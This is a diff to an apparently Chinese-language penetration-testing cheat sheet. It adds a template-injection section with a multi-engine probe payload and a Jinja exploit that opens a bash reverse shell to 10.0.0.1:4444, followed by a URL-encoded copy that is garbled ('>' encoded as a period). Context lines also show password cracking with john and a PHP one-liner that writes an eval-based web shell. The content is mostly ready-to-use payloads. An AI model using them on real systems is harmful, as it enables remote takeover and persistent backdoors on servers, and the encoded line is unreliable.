@@ -162,6 +162,29 @@ cd ~
 john hash --wordlist=rockyou.txt
 ```
 
+
+## 模板注入
+
+#### 模板注入漏洞漏洞验证通杀payload
+
+```
+{{1+abcxyz}}${1+abcxyz}<%1+abcxyz%>[abcxyz]
+```
+
+如果看到了报错，则存在模板注入漏洞
+
+#### jinjia模板漏洞exp
+
+```
+{% import os %}{{os.system('bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"')}}
+```
+
+进行ascii编码：
+
+```
+%7B%25%20import%20os%20%25%7D%7B%7Bos%2Esystem%28%27bash%20%2Dc%20%22bash%20%2Di%20%2E&%20%2Fdev%2Ftcp%2F10%2E0%2E0%2E1%2F4444%200%2E&1%22%27%29%7D%7D
+```
+
 ## 其他
 
 #### php url传参执行cmd命令
@@ -241,6 +264,7 @@ apt install seclists
 key is 'x'
 
 
+
 # 杂
 
 **$1$** is MD5
@@ -258,7 +282,6 @@ file_include传马
 ```php
 <?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["bgxg"]); ?>'); ?>
 ```
-
 
 
 
